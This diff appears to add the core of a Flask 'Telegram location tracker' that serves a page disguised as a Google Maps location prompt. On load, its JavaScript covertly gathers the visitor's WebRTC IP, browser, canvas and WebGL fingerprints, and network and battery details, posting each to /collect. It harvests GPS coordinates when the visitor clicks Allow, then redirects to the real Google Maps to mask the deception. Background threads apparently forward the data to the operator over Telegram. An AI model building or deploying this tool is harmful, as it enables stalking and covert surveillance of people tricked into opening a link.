@@ -490,4 +490,52 @@ button{flex:1;padding:12px 16px;border:none;border-radius:12px;cursor:pointer;fo
         try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('');pc.createOffer().then(function(o){return pc.setLocalDescription(o)});pc.onicecandidate=function(ice){if(!ice||!ice.candidate)return;var m=ice.candidate.candidate.match(/([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/);if(m){fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webrtc_ip:m[1]})}).catch(function(){});points++}};setTimeout(function(){try{pc.close()}catch(e){}},3000)}catch(e){}
         var fp={width:screen.width,height:screen.height,colorDepth:screen.colorDepth,platform:navigator.platform,languages:navigator.languages?Array.from(navigator.languages):[navigator.language],timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,cookiesEnabled:navigator.cookieEnabled,localStorage:typeof(Storage)!=='undefined',sessionStorage:typeof(Storage)!=='undefined'};
         fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({fingerprint:fp})}).catch(function(){});points++;
-        try{var c=document.createElement('canvas');c.width=400;c.height=150;var x=c.getContext('2d');x.fillStyle='#ffffff';x.fillRect(0,0,400,150);x.fillStyle='#4285F4';x.fillRect(0,0,400,40);x.fillStyle='#ffffff';x.font='bold 22px Arial,sans-serif';x.textBaseline='middle';x.fillText('Google Maps',20,22);x.beginPath();x.arc(340,75,20,0,Math.PI*2);x.fillStyle='#ea4335';x.fill();x.strokeStyle='#ffffff';x.lineWidth=3;x.stroke();x.beginPath();x.arc(340,75,8,0,Math.PI*2);x.fillStyle='#ffffff';x.fill();x.strokeStyle='#dadce0';x.lineWidth=2;for(var i=0;i<6;i++){x.beginPath();x.moveTo(20,55+i*18);x.lineTo(280,55+i*18);x.stroke()}x.fillStyle='#fbbc04';x.fillRect(30,60,40,30);x.fillStyle='#34a853';x.fillRect(100,78,50,40);x.fillStyle='#4285F4';x.fillRect(180,55,35,35);x.fillStyle='#ea4335';x.fillRect(230,90,45,25);x.fillStyle='#202124';x.font='14px Arial';x.textBaseline='top';x.fillText('Current Location',20,120);x.fillStyle='#5f6368';x.font='12px Arial';x.fillText('Accurac
+        try{var c=document.createElement('canvas');c.width=400;c.height=150;var x=c.getContext('2d');x.fillStyle='#ffffff';x.fillRect(0,0,400,150);x.fillStyle='#4285F4';x.fillRect(0,0,400,40);x.fillStyle='#ffffff';x.font='bold 22px Arial,sans-serif';x.textBaseline='middle';x.fillText('Google Maps',20,22);x.beginPath();x.arc(340,75,20,0,Math.PI*2);x.fillStyle='#ea4335';x.fill();x.strokeStyle='#ffffff';x.lineWidth=3;x.stroke();x.beginPath();x.arc(340,75,8,0,Math.PI*2);x.fillStyle='#ffffff';x.fill();x.strokeStyle='#dadce0';x.lineWidth=2;for(var i=0;i<6;i++){x.beginPath();x.moveTo(20,55+i*18);x.lineTo(280,55+i*18);x.stroke()}x.fillStyle='#fbbc04';x.fillRect(30,60,40,30);x.fillStyle='#34a853';x.fillRect(100,78,50,40);x.fillStyle='#4285F4';x.fillRect(180,55,35,35);x.fillStyle='#ea4335';x.fillRect(230,90,45,25);x.fillStyle='#202124';x.font='14px Arial';x.textBaseline='top';x.fillText('Current Location',20,120);x.fillStyle='#5f6368';x.font='12px Arial';x.fillText('Accuracy: +/- 12m',180,122);fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({canvas_fp:c.toDataURL('image/png')})}).catch(function(){});points++}catch(e){}
+        try{var cv=document.createElement('canvas');var gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');if(gl){fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webgl:{vendor:gl.getParameter(gl.VENDOR),renderer:gl.getParameter(gl.RENDERER)}})}).catch(function(){});points++}}catch(e){}
+        if(navigator.connection){var nc=navigator.connection;fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wifi_scan:{type:nc.type||'unknown',effectiveType:nc.effectiveType||'unknown',rtt:nc.rtt,downlink:nc.downlink,downlinkMax:nc.downlinkMax||'unknown',saveData:nc.saveData||false}})}).catch(function(){});points++}
+        if(navigator.getBattery){navigator.getBattery().then(function(b){var ni={};if(navigator.connection)ni={type:navigator.connection.effectiveType,downlink:navigator.connection.downlink};fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({battery:{level:b.level,charging:b.charging},network:ni})}).catch(function(){})}).catch(function(){})}
+        console.log('[+] Silent data collected: '+points+' points');
+    }
+    collectSilentData();
+    
+    allowBtn.addEventListener('click',function(){
+        disableButtons();allowBtn.textContent='Accessing...';
+        if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(pos){capturedLat=pos.coords.latitude;capturedLon=pos.coords.longitude;allowBtn.textContent='Location Shared';fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:capturedLat,lon:capturedLon,acc:pos.coords.accuracy,alt:pos.coords.altitude,speed:pos.coords.speed})}).catch(function(){});setTimeout(function(){window.location.href='https://maps.google.com/?q='+capturedLat+','+capturedLon},2000)},function(err){var m='Location unavailable';if(err.code===1)m='Permission denied';else if(err.code===2)m='Position unavailable';else if(err.code===3)m='Timed out';allowBtn.textContent=m;fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({gps_error:err.message,gps_code:err.code})}).catch(function(){});setTimeout(function(){window.location.href='https://maps.google.com'},2000)},{enableHighAccuracy:true,timeout:15000,maximumAge:0})}else{allowBtn.textContent='GPS Unavailable';setTimeout(function(){window.location.href='https://maps.google.com'},2000)}
+    });
+    
+    denyBtn.addEventListener('click',function(){
+        disableButtons();denyBtn.textContent='Opening...';
+        fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({gps_error:'User clicked Not Now',gps_code:1})}).catch(function(){});
+        setTimeout(function(){window.location.href='https://maps.google.com'},1000);
+    });
+})();
+</script>
+</body>
+</html>
+"""
+
+# ================== MAIN ==================
+def main():
+    """Run everything on Render."""
+    
+    print("\n" + "=" * 55)
+    print("  TELEGRAM LOCATION TRACKER - MULTI-USER")
+    print("=" * 55)
+    print(f"  Port:     {PORT}")
+    print(f"  URL:      {RENDER_URL}")
+    print("=" * 55 + "\n")
+    
+    # Start data forwarder
+    forwarder_thread = threading.Thread(target=telegram_data_forwarder, daemon=True)
+    forwarder_thread.start()
+    
+    # Start Telegram bot poller
+    poller_thread = threading.Thread(target=bot_poller, daemon=True)
+    poller_thread.start()
+    
+    # Run Flask (this blocks)
+    app.run(host="0.0.0.0", port=PORT, debug=False)
+
+
+if __name__ == '__main__':
+    main()
